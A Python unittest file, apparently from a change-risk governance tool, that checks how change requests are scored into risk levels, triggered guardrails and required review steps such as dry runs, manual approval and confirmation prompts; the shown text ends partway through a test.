import json
import os
import shutil
import subprocess
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
import sys

sys.path.insert(0, str(ROOT / "lib"))

from adaptive_change_governance.config_loader import dump_yaml, load_yaml
from adaptive_change_governance.artifact_validator import ArtifactValidator
import adaptive_change_governance.cli as cli_module
from adaptive_change_governance.artifact_context import apply_validated_artifacts
from adaptive_change_governance.context_adjuster import apply_user_context
from adaptive_change_governance.diff_verifier import DiffVerifier
from adaptive_change_governance.human_review import HumanReviewGate, ReviewError
from adaptive_change_governance.intent_model import normalize_intent
from adaptive_change_governance.reassessment import ReassessmentRunner
from adaptive_change_governance.repository_analyzer import RepositoryAnalyzer
from adaptive_change_governance.run_retention import cleanup_runs
from adaptive_change_governance.risk_evaluator import RiskEvaluator
from adaptive_change_governance.schema_validator import ValidationError, validate_all, validate_risk_calibration
from adaptive_change_governance.workflow_composer import WorkflowComposer


class Phase1Test(unittest.TestCase):
    def setUp(self):
        self.project_risk = load_yaml(ROOT / ".ai-governance/project-risk.yaml")
        self.guardrails = load_yaml(ROOT / ".ai-governance/guardrails.yaml")
        self.modules = load_yaml(ROOT / ".ai-governance/workflow-modules.yaml")
        self.risk_calibration = load_yaml(ROOT / ".ai-governance/risk-calibration.yaml")
        self.charging_project_risk = load_yaml(ROOT / ".ai-governance/profiles/charging-platform/project-risk.yaml")
        self.charging_guardrails = load_yaml(ROOT / ".ai-governance/profiles/charging-platform/guardrails.yaml")

    def test_config_files_validate(self):
        validate_all(self.project_risk, self.guardrails, self.modules)
        validate_risk_calibration(self.risk_calibration)
        validate_all(self.charging_project_risk, self.charging_guardrails, self.modules)

    def test_bad_config_reports_clear_error(self):
        bad = dict(self.project_risk)
        bad["project"] = {"name": "bad", "baseline_level": "LX"}
        with self.assertRaisesRegex(ValidationError, "baseline_level"):
            validate_all(bad, self.guardrails, self.modules)

    def test_audit_retention_policy_validates(self):
        bad = dict(self.project_risk)
        bad["audit_retention"] = {"audit_mode": "git", "retain_latest": 0, "retain_days": 30}
        with self.assertRaisesRegex(ValidationError, "audit_retention"):
            validate_all(bad, self.guardrails, self.modules)

    def test_bad_risk_calibration_reports_clear_error(self):
        bad = {"version": 1, "level_thresholds": {"L2": 20, "L3": 10, "L4": 40}}
        with self.assertRaisesRegex(ValidationError, "level_thresholds.L3"):
            validate_risk_calibration(bad)

    def test_money_change_triggers_hard_guardrail_and_required_modules(self):
        evidence = RepositoryAnalyzer(ROOT).analyze("调整退款金额保留两位小数的计算方式。", self.project_risk)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        workflow = WorkflowComposer(self.project_risk, self.modules).compose(evidence, risk)
        required = workflow["workflow_recommendation"]["required_modules"]
        self.assertIn("financial-calculation-change", risk["triggered_guardrails"])
        self.assertGreaterEqual({"L1": 1, "L2": 2, "L3": 3, "L4": 4}[risk["final_level"]], 3)
        for module in ("business_rule_confirmation", "boundary_test", "independent_review", "reconciliation_test"):
            self.assertIn(module, required)

    def test_charging_profile_keeps_charging_specific_money_guardrail(self):
        evidence = RepositoryAnalyzer(ROOT).analyze("调整退款金额保留两位小数的计算方式。", self.charging_project_risk)
        risk = RiskEvaluator(self.charging_project_risk, self.charging_guardrails).evaluate(evidence)
        self.assertIn("money-change", risk["triggered_guardrails"])
        self.assertGreaterEqual({"L1": 1, "L2": 2, "L3": 3, "L4": 4}[risk["final_level"]], 3)

    def test_low_risk_copy_change_can_remain_lightweight(self):
        # 轻流程只能由模型 intent 判定，不再由请求措辞猜测。
        intent = {"change_kind": "copy_change", "change_nature": "display_text_only", "risk_hints": {}}
        evidence = RepositoryAnalyzer(ROOT).analyze("修改后台订单页面上的提示文案。", self.project_risk, intent=intent)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        workflow = WorkflowComposer(self.project_risk, self.modules).compose(evidence, risk)
        rec = workflow["workflow_recommendation"]
        self.assertEqual("L1", risk["final_level"])
        self.assertEqual(["code_fact_scan", "regression_test"], rec["required_modules"])
        self.assertTrue(any(item["module"] == "technical_design" for item in rec["skipped_modules"]))

    def test_menu_label_change_without_model_intent_is_not_auto_lightweight(self):
        # 请求措辞不再能把风险压低：没有模型 intent 时，同一个菜单文案请求不走轻流程。
        # 系统宁可因为无关代码信号（handler.py 里的 delete 字符串）往严里错，
        # 也不靠字面猜测去抑制风险。轻流程由 test_model_intent_can_route_... 覆盖。
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "frontend/src/layouts").mkdir(parents=True)
            (temp / "frontend/src/layouts/BotLayout.vue").write_text("<span>群配置</span>\n", encoding="utf-8")
            (temp / "app/bot").mkdir(parents=True)
            (temp / "app/bot/handler.py").write_text(
                "def clean_group_config_cache():\n"
                "    sql = 'delete from cache_items where name = 群配置'\n"
                "    return {'api_schema': 'message'}\n",
                encoding="utf-8",
            )
            evidence = RepositoryAnalyzer(temp).analyze("把后台「群配置」相关的菜单修改为「业务群配置」", self.project_risk)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            workflow = WorkflowComposer(self.project_risk, self.modules).compose(evidence, risk)
            self.assertFalse(evidence["code_findings"]["text_only_change"])
            self.assertNotEqual("L1", risk["final_level"])
            self.assertNotEqual(
                ["code_fact_scan", "regression_test"],
                workflow["workflow_recommendation"]["required_modules"],
            )
        finally:
            shutil.rmtree(temp)

    def test_model_intent_can_route_menu_label_change_lightweight(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "frontend/src/layouts").mkdir(parents=True)
            (temp / "frontend/src/layouts/BotLayout.vue").write_text("<span>群配置</span>\n", encoding="utf-8")
            (temp / "app/bot").mkdir(parents=True)
            (temp / "app/bot/shared.py").write_text(
                "def delete_group_config_cache():\n"
                "    return {'api_schema': 'message'}\n",
                encoding="utf-8",
            )
            intent = {
                "version": 1,
                "change_kind": "menu_label_change",
                "summary": "rename menu display text only",
                "confidence": "high",
                "scope": {
                    "included": ["rename the backend menu display label"],
                    "excluded": ["database changes", "public API changes", "permission key changes"],
                    "unknowns": [],
                },
                "risk_hints": {
                    "data_operation": False,
                    "database_schema_change": False,
                    "public_interface_change": False,
                    "permission_change": False,
                    "security_change": False,
                    "financial_change": False,
                },
            }
            evidence = RepositoryAnalyzer(temp).analyze(
                "把后台「群配置」相关的菜单修改为「业务群配置」",
                self.project_risk,
                intent=intent,
            )
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertTrue(evidence["code_findings"]["text_only_change"])
            self.assertEqual("menu_label_change", evidence["request"]["model_intent"]["change_kind"])
            self.assertEqual("L1", risk["final_level"])
            self.assertEqual([], risk["triggered_guardrails"])
        finally:
            shutil.rmtree(temp)

    def test_file_risk_makes_database_file_higher_risk_than_ui_copy(self):
        ui_temp = Path(tempfile.mkdtemp())
        db_temp = Path(tempfile.mkdtemp())
        try:
            (ui_temp / "frontend/src/layouts").mkdir(parents=True)
            (ui_temp / "frontend/src/layouts/BotLayout.vue").write_text("<span>群配置</span>\n", encoding="utf-8")
            ui_intent = {"change_kind": "menu_label_change", "change_nature": "display_text_only", "risk_hints": {}}
            ui_evidence = RepositoryAnalyzer(ui_temp).analyze("把后台「群配置」相关的菜单修改为「业务群配置」", self.project_risk, intent=ui_intent)
            ui_risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(ui_evidence)

            (db_temp / "app").mkdir(parents=True)
            (db_temp / "app/database.py").write_text("DATABASE_NAME = 'main'\n", encoding="utf-8")
            db_evidence = RepositoryAnalyzer(db_temp).analyze("修改数据库连接名称 database", self.project_risk)
            db_risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(db_evidence)

            self.assertEqual("low", ui_evidence["code_findings"]["file_risk"]["highest_level"])
            self.assertEqual("high", db_evidence["code_findings"]["file_risk"]["highest_level"])
            self.assertTrue(any(item.get("pattern") == "semantic:data_access" for item in db_evidence["code_findings"]["file_risk"]["matches"]))
            self.assertEqual("L1", ui_risk["final_level"])
            self.assertGreater({"L1": 1, "L2": 2, "L3": 3, "L4": 4}[db_risk["final_level"]], {"L1": 1, "L2": 2, "L3": 3, "L4": 4}[ui_risk["final_level"]])
        finally:
            shutil.rmtree(ui_temp)
            shutil.rmtree(db_temp)

    def test_semantic_file_role_can_raise_unconfigured_database_file_risk(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "src/persistence").mkdir(parents=True)
            (temp / "src/persistence/connection.ts").write_text(
                "export const databaseUrl = process.env.DATABASE_URL\n"
                "export function query(sql: string) { return sql }\n",
                encoding="utf-8",
            )
            evidence = RepositoryAnalyzer(temp).analyze("修改 database 连接名称", self.project_risk)
            file_risk = evidence["code_findings"]["file_risk"]
            boundary = evidence["code_findings"]["feature_boundary"]
            self.assertEqual("high", file_risk["highest_level"])
            self.assertTrue(any(item.get("pattern") == "semantic:data_access" for item in file_risk["matches"]))
            self.assertTrue(any(item["role"] == "data_access" for item in boundary["file_roles"]))
        finally:
            shutil.rmtree(temp)

    def test_comment_only_change_lowers_effective_file_risk_but_keeps_inherent_risk(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir(parents=True)
            (temp / "app/database.py").write_text("# database connection name docs\nDATABASE_NAME = 'main'\n", encoding="utf-8")
            intent = {
                "version": 1,
                "change_kind": "comment_change",
                "change_nature": "comment_only",
                "summary": "update a comment in database.py",
                "confidence": "high",
                "scope": {"included": ["comment only"], "excluded": ["executable code"], "unknowns": ["diff must confirm comment-only"]},
                "risk_hints": {
                    "data_operation": False,
                    "database_schema_change": False,
                    "public_interface_change": False,
                    "permission_change": False,
                    "security_change": False,
                    "financial_change": False,
                },
            }
            evidence = RepositoryAnalyzer(temp).analyze("修改 app/database.py 中的一行注释", self.project_risk, intent=intent)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            file_risk = evidence["code_findings"]["file_risk"]
            self.assertEqual("high", file_risk["highest_level"])
            self.assertEqual("low", file_risk["effective_level"])
            self.assertEqual("lowered_by_change_nature", file_risk["risk_adjustment"])
            self.assertTrue(any("diff is comment" in item for item in evidence["unknowns"]))
            self.assertEqual("L1", risk["final_level"])
        finally:
            shutil.rmtree(temp)

    def test_analysis_only_goal_stops_without_implementation_modules(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app").mkdir(parents=True)
            (temp / "app/database.py").write_text("DATABASE_NAME = 'main'\n", encoding="utf-8")
            intent = {
                "version": 1,
                "change_kind": "risk_analysis",
                "change_nature": "analysis_only",
                "summary": "分析删除数据库配置的风险，不修改代码",
                "confidence": "high",
                "request_goal": {
                    "type": "analysis_only",
                    "requires_code_change": False,
                    "default_stop_gate": "analysis_complete",
                    "rationale": "INFERENCE: user asks for risk analysis only.",
                },
                "scope": {"included": ["risk analysis"], "excluded": ["code changes"], "unknowns": []},
                "risk_hints": {
                    "data_operation": False,
                    "database_schema_change": False,
                    "public_interface_change": False,
                    "permission_change": False,
                    "security_change": False,
                    "financial_change": False,
                },
            }
            evidence = RepositoryAnalyzer(temp).analyze("分析删除数据库配置会有什么风险", self.project_risk, intent=intent)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            workflow = WorkflowComposer(self.project_risk, self.modules).compose(evidence, risk)
            rec = workflow["workflow_recommendation"]
            self.assertEqual("analysis_only", rec["request_goal"]["type"])
            self.assertFalse(rec["request_goal"]["requires_code_change"])
            self.assertEqual("analysis_complete", rec["default_stop_gate"])
            self.assertEqual([], risk["triggered_guardrails"])
            self.assertIn("code_fact_scan", rec["required_modules"])
            self.assertNotIn("technical_design", rec["required_modules"])
            self.assertNotIn("test_design", rec["required_modules"])
            self.assertNotIn("regression_test", rec["required_modules"])
        finally:
            shutil.rmtree(temp)

    def test_analysis_only_cli_blocks_technical_plan_generation(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            (temp / "app").mkdir()
            (temp / "app/database.py").write_text("DATABASE_NAME = 'main'\n", encoding="utf-8")
            intent_path = temp / "intent.yaml"
            intent_path.write_text(
                "\n".join([
                    "version: 1",
                    "change_kind: risk_analysis",
                    "change_nature: analysis_only",
                    "summary: 分析风险，不修改代码",
                    "confidence: high",
                    "request_goal:",
                    "  type: analysis_only",
                    "  requires_code_change: false",
                    "  default_stop_gate: analysis_complete",
                    "scope:",
                    "  included: [risk analysis]",
                    "  excluded: [code changes]",
                    "  unknowns: []",
                    "risk_hints:",
                    "  data_operation: false",
                    "  database_schema_change: false",
                    "  public_interface_change: false",
                    "  permission_change: false",
                    "  security_change: false",
                    "  financial_change: false",
                ]),
                encoding="utf-8",
            )
            subprocess.run(["git", "init"], cwd=temp, check=True, capture_output=True, text=True)
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            assess = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "分析删除数据库配置会有什么风险", "--intent-file", str(intent_path)],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
            self.assertIn("Request goal: analysis_only", assess.stdout)
            self.assertIn("Next gate: analysis_complete", assess.stdout)
            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
            review = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(review.returncode, 0, review.stderr + review.stdout)
            self.assertIn("Current gate: analysis_complete", review.stdout)
            self.assertIn("--generate-analysis-report", review.stdout)
            next_action = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--next", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(next_action.returncode, 0, next_action.stderr + next_action.stdout)
            self.assertIn("Requires human confirmation: no", next_action.stdout)
            self.assertIn("Next action: generate_analysis_report", next_action.stdout)
            continued = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--continue", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(continued.returncode, 0, continued.stderr + continued.stdout)
            self.assertIn("Auto-executing: generate_analysis_report", continued.stdout)
            self.assertIn("Continue finished: run is complete", continued.stdout)
            self.assertTrue((run_dir / "analysis-report.yaml").exists())
            self.assertTrue((run_dir / ".analysis-complete").exists())
            (run_dir / "analysis-report.yaml").unlink()
            (run_dir / "analysis-report.md").unlink()
            (run_dir / ".analysis-complete").unlink()
            next_execute = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--next", run_dir.name, "--execute-next"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(next_execute.returncode, 0, next_execute.stderr + next_execute.stdout)
            self.assertIn("Analysis report generated", next_execute.stdout)
            self.assertTrue((run_dir / "analysis-report.yaml").exists())
            (run_dir / "analysis-report.yaml").unlink()
            (run_dir / "analysis-report.md").unlink()
            (run_dir / ".analysis-complete").unlink()
            report = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--generate-analysis-report", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(report.returncode, 0, report.stderr + report.stdout)
            self.assertIn("Analysis report generated", report.stdout)
            self.assertTrue((run_dir / "analysis-report.yaml").exists())
            self.assertTrue((run_dir / "analysis-report.md").exists())
            self.assertTrue((run_dir / ".analysis-complete").exists())
            report_data = load_yaml(run_dir / "analysis-report.yaml")
            self.assertEqual("analysis_only", report_data["request"]["goal"]["type"])
            self.assertEqual("analysis_complete", report_data["request"]["default_stop_gate"])
            self.assertIn("do not generate technical-plan", " ".join(report_data["recommended_next_actions"]))
            blocked = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(blocked.returncode, 3, blocked.stderr + blocked.stdout)
            self.assertIn("request goal is analysis_only", blocked.stdout)
        finally:
            shutil.rmtree(temp)

    def test_risk_scenario_cli_validates_default_calibration(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs", "risk-scenario-report.*"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--validate-risk-scenarios"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            self.assertIn("Status: pass", result.stdout)
            self.assertTrue((temp / ".ai-governance/risk-scenario-report.yaml").exists())
            report = load_yaml(temp / ".ai-governance/risk-scenario-report.yaml")
            self.assertEqual("pass", report["status"])
            self.assertGreaterEqual(report["summary"]["passed"], 4)
        finally:
            shutil.rmtree(temp)

    def test_suggest_risk_config_writes_suggestions_without_modifying_config(self):
        temp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs", "risk-*-report.*", "risk-config-suggestions.*"))
            shutil.copytree(ROOT / "lib", temp / "lib")
            shutil.copytree(ROOT / "bin", temp / "bin")
            (temp / "app/api").mkdir(parents=True)
            (temp / "app/api/auth.py").write_text("def login(): pass\n", encoding="utf-8")
            (temp / "app/jobs").mkdir(parents=True)
            (temp / "app/jobs/reconcile.py").write_text("def run(): pass\n", encoding="utf-8")
            (temp / "sql").mkdir()
            (temp / "sql/schema.sql").write_text("create table example(id int);\n", encoding="utf-8")
            (temp / "frontend/src/views").mkdir(parents=True)
            (temp / "frontend/src/views/Home.vue").write_text("<template>Home</template>\n", encoding="utf-8")
            before = (temp / ".ai-governance/project-risk.yaml").read_bytes()
            env = os.environ.copy()
            env["PYTHONPATH"] = str(temp / "lib")
            result = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--suggest-risk-config"],
                cwd=temp,
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
            self.assertIn("Risk config suggestions written", result.stdout)
            self.assertIn("No governance config was modified", result.stdout)
            self.assertIn("Draft config:", result.stdout)
            self.assertIn("--suggest-risk-config --apply-risk-config", result.stdout)
            self.assertEqual(before, (temp / ".ai-governance/project-risk.yaml").read_bytes())
            report_path = temp / ".ai-governance/risk-config-suggestions.yaml"
            self.assertTrue(report_path.exists())
            self.assertTrue((temp / ".ai-governance/risk-config-suggestions.md").exists())
            draft_path = temp / ".ai-governance/project-risk.suggested.yaml"
            self.assertTrue(draft_path.exists())
            report = load_yaml(report_path)
            self.assertEqual("suggestions_only", report["status"])
            self.assertEqual(".ai-governance/project-risk.suggested.yaml", report["draft_config"])
            self.assertGreater(report["summary"]["scanned_files"], 0)
            patterns = {item["pattern"]: item for item in report["all_candidates"]}
            self.assertIn("**/*.sql", patterns)
            self.assertIn("**/jobs/**", patterns)
            self.assertIn("frontend/src/views/**", patterns)
            self.assertTrue(patterns["**/*.sql"]["already_configured"])
            self.assertFalse(patterns["**/jobs/**"]["already_configured"])
            draft = load_yaml(draft_path)
            draft_patterns = {item["pattern"] for item in draft["file_risk"]}
            self.assertIn("**/jobs/**", draft_patterns)
            self.assertIn("frontend/src/views/**", draft_patterns)
            self.assertNotEqual(before, draft_path.read_bytes())

            rejected = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--suggest-risk-config", "--apply-risk-config"],
                cwd=temp,
                env=env,
                input="NO\n",
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(rejected.returncode, 3, rejected.stderr + rejected.stdout)
            self.assertIn("ABORTED", rejected.stdout)
            self.assertEqual(before, (temp / ".ai-governance/project-risk.yaml").read_bytes())

            applied = subprocess.run(
                [sys.executable, str(temp / "bin/change-assess"), "--suggest-risk-config", "--apply-risk-config"],
                cwd=temp,
                env=env,
                input="APPLY\n",
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(applied.returncode, 0, applied.stderr + applied.stdout)
            self.assertIn("Applied suggested risk config", applied.stdout)
            self.assertEqual(draft_path.read_bytes(), (temp / ".ai-governance/project-risk.yaml").read_bytes())
        finally:
            shutil.rmtree(temp)

    def test_user_context_can_remove_weak_risk_signal_but_not_strong_evidence(self):
        weak_evidence = {
            "version": 1,
            "request": {"original": "修改菜单文案", "request_goal": {"requires_code_change": True}},
            "repository": {"branch": "unknown", "commit": "unknown"},
            "code_findings": {
                "direct_files": [{"path": "app/api/auth.py", "reason": "WEAK SIGNAL: generic API file"}],
                "related_files": [],
                "affected_modules": ["app"],
                "affected_domains": [],
                "change_types": ["public_api"],
                "operations": [],
                "domain_evidence": [],
                "change_type_evidence": [{
                    "value": "public_api",
                    "source": "code_search",
                    "path": "app/api/auth.py",
                    "keyword": "api",
                    "strength": "weak",
                    "fact": "WEAK SIGNAL: generic api keyword",
                }],
                "operation_evidence": [],
                "database_changes": False,
                "message_schema_changes": False,
                "public_api_changes": True,
                "file_risk": {"highest_score": 1, "effective_score": 1},
            },
            "test_findings": {"coverage_confidence": "low"},
            "unknowns": [],
            "evidence_sources": ["code_search"],
        }
        context = {"scope": {"excluded": ["public API changes"]}, "corrections": []}
        adjusted = apply_user_context(weak_evidence, context)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(adjusted)
        self.assertNotIn("public_api", adjusted["code_findings"]["change_types"])
        self.assertFalse(adjusted["code_findings"]["public_api_changes"])
        self.assertNotIn("public-interface-change", risk["triggered_guardrails"])
        self.assertTrue(adjusted["context_adjustments"]["applied"])

        strong_evidence = dict(weak_evidence)
        strong_evidence["code_findings"] = dict(weak_evidence["code_findings"])
        strong_evidence["code_findings"]["change_type_evidence"] = [dict(weak_evidence["code_findings"]["change_type_evidence"][0], strength="strong")]
        strong_adjusted = apply_user_context(strong_evidence, context)
        self.assertIn("public_api", strong_adjusted["code_findings"]["change_types"])
        self.assertTrue(strong_adjusted["context_adjustments"]["conflicts"])

    def test_validated_artifact_context_reduces_uncertainty_without_removing_strong_guardrails(self):
        temp = Path(tempfile.mkdtemp())
        try:
            dump_yaml(temp / "progress.yaml", {
                "steps": [{
                    "id": "dependency_analysis",
                    "status": "done",
                    "artifacts": ["dependency-analysis.yaml"],
                }],
            })
            dump_yaml(temp / "artifact-validation-dependency_analysis.yaml", {
                "status": "pass",
                "artifact": "dependency-analysis.yaml",
            })
            dump_yaml(temp / "dependency-analysis.yaml", {
                "module": "dependency_analysis",
                "summary": "Only internal frontend consumers were found.",
                "evidence": [{
                    "path": "frontend/src/api/bot.js",
                    "line": 64,
                    "fact": "FACT: /iot-debug consumers are internal frontend calls only.",
                    "confidence": "high",
                }],
            })
            evidence = {
                "version": 1,
                "request": {"original": "移除公开接口", "request_goal": {"requires_code_change": True}},
                "repository": {"branch": "unknown", "commit": "unknown"},
                "code_findings": {
                    "direct_files": [{"path": "app/api/iot_debug.py", "reason": "FACT: feature endpoint"}],
                    "related_files": [],
                    "affected_modules": ["app"],
                    "affected_domains": ["public-interface"],
                    "change_types": ["public_api"],
                    "operations": [],
                    "domain_evidence": [],
                    "change_type_evidence": [{
                        "value": "public_api",
                        "source": "code_search",
                        "path": "app/api/iot_debug.py",
                        "keyword": "api",
                        "strength": "strong",
                        "fact": "FACT: endpoint file is in scope.",
                    }],
                    "operation_evidence": [],
                    "database_changes": False,
                    "message_schema_changes": False,
                    "public_api_changes": True,
                    "file_risk": {"highest_score": 3, "effective_score": 3},
                    "feature_boundary": {"summary": {"confidence": "high", "ambiguous_important_files": 0}},
                },
                "test_findings": {"coverage_confidence": "low"},
                "unknowns": ["UNKNOWN: external consumers must be confirmed."],
                "evidence_sources": ["code_search"],
            }
            adjusted = apply_validated_artifacts(evidence, temp)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(adjusted)
            self.assertIn("artifact_context", adjusted)
            self.assertEqual("high", adjusted["artifact_context"]["artifacts"][0]["confidence"])
            self.assertIn("validated_module_artifacts", adjusted["evidence_sources"])
            self.assertEqual(evidence["unknowns"], adjusted["unknowns"])
            self.assertIn("public-interface-change", risk["triggered_guardrails"])
            uncertainty = next(item for item in risk["risk_explanation"]["dimension_explanations"] if item["dimension"] == "uncertainty")
            self.assertIn("FACT: validated_artifact_confidence=high", uncertainty["evidence"])
        finally:
            shutil.rmtree(temp)

    def test_destructive_database_operation_cannot_drop_hard_gate(self):
        evidence = RepositoryAnalyzer(ROOT).analyze("删除重复的设备端口状态数据。", self.project_risk)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        workflow = WorkflowComposer(self.project_risk, self.modules).compose(evidence, risk)
        rec = workflow["workflow_recommendation"]
        self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
        self.assertNotIn("physical-device-control", risk["triggered_guardrails"])
        self.assertEqual("L4", risk["final_level"])
        self.assertIn("dry_run", rec["required_modules"])
        self.assertIn("manual_approval", rec["required_modules"])
        self.assertIn("direct_production_execution", rec["prohibited"])
        self.assertTrue(risk["triggered_guardrail_details"])
        self.assertTrue(any("删除" in fact["text"] for detail in risk["triggered_guardrail_details"] for match in detail["matches"] for fact in match["evidence"]))

    def test_code_and_config_removal_does_not_imply_destructive_database_operation(self):
        evidence = RepositoryAnalyzer(ROOT).analyze("将IoT设备调试功能从管理系统中移除，并删除对应的代码和配置", self.project_risk)
        risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
        self.assertNotIn("destructive-database-operation", risk["triggered_guardrails"])
        self.assertNotIn("delete", evidence["code_findings"]["operations"])
        self.assertTrue(any(item.get("value") == "code_or_config_removal" for item in evidence["code_findings"]["operation_evidence"]))

    def test_related_orm_mapping_delete_triggers_destructive_database_operation(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app/iot_debug").mkdir(parents=True)
            (temp / "app/iot_debug/models.py").write_text(
                "from sqlalchemy import Column\n"
                "class IotDebugRecord:\n"
                "    __tablename__ = 'iot_debug_records'\n"
                "    def delete_debug_data(self):\n"
                "        pass\n",
                encoding="utf-8",
            )
            evidence = RepositoryAnalyzer(temp).analyze("删除 IoT debug 数据", self.project_risk)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
            self.assertIn("delete", evidence["code_findings"]["operations"])
        finally:
            shutil.rmtree(temp)

    def test_unrelated_orm_mapping_delete_is_weak_signal_only(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app/auth").mkdir(parents=True)
            (temp / "app/auth/models.py").write_text(
                "from sqlalchemy import Column\n"
                "class AuthToken:\n"
                "    __tablename__ = 'auth_tokens'\n"
                "    def delete_token_data(self):\n"
                "        pass\n",
                encoding="utf-8",
            )
            evidence = RepositoryAnalyzer(temp).analyze("移除 IoT 调试功能", self.project_risk)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertNotIn("destructive-database-operation", risk["triggered_guardrails"])
            self.assertNotIn("delete", evidence["code_findings"]["operations"])
        finally:
            shutil.rmtree(temp)

    def test_distant_feature_token_does_not_make_delete_file_strong(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "app/api").mkdir(parents=True)
            (temp / "app/api/auth.py").write_text(
                "API_TITLE = 'IoT management system'\n\n"
                "def delete_session(session_id):\n"
                "    sql = 'delete from auth_sessions where id = ?'\n"
                "    return sql\n",
                encoding="utf-8",
            )
            evidence = RepositoryAnalyzer(temp).analyze("将IoT设备调试功能从管理系统中移除，并删除对应的代码和配置", self.project_risk)
            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
            self.assertNotIn("destructive-database-operation", risk["triggered_guardrails"])
            self.assertNotIn("delete", evidence["code_findings"]["operations"])
            weak_delete = [
                item for item in evidence["code_findings"]["operation_evidence"]
                if item.get("path") == "app/api/auth.py" and item.get("keyword") == "delete"
            ]
            self.assertTrue(weak_delete)
            self.assertTrue(all(item.get("strength") == "weak" for item in weak_delete))
        finally:
            shutil.rmtree(temp)

    def test_charging_profile_distinguishes_device_data_from_device_control(self):
        data_evidence = RepositoryAnalyzer(ROOT).analyze("删除重复的设备端口状态数据。", self.charging_project_risk)
        data_risk = RiskEvaluator(self.charging_project_risk, self.charging_guardrails).evaluate(data_evidence)
        self.assertIn("destructive-database-operation", data_risk["triggered_guardrails"])
        self.assertNotIn("device-control", data_risk["triggered_guardrails"])

        control_evidence = RepositoryAnalyzer(ROOT).analyze("修改设备停止充电指令的重试逻辑。", self.charging_project_risk)
        control_risk = RiskEvaluator(self.charging_project_risk, self.charging_guardrails).evaluate(control_evidence)
        self.assertIn("device-control", control_risk["triggered_guardrails"])

    def test_non_git_scan_records_unknowns(self):
        temp = Path(tempfile.mkdtemp())
        try:
            (temp / "README.md").write_text("hello", encoding="utf-8")
            evidence = RepositoryAnalyzer(temp).analyze("修改提示文案", self.project_risk)
            self.assertFalse(evidence["repository"]["git_available"])
            self.assertTrue(any("git metadata" in item for item in evidence["unknowns"]))
            self.assertTrue(any("dynamic calls" in item for item in evidence["unknowns"]))
        finally:
            shutil.rmtree(temp)

    def test_project_root_falls_back_to_pwd_when_cwd_fails(self):
        temp = Path(tempfile.mkdtemp())
        original_cwd = cli_module.Path.cwd
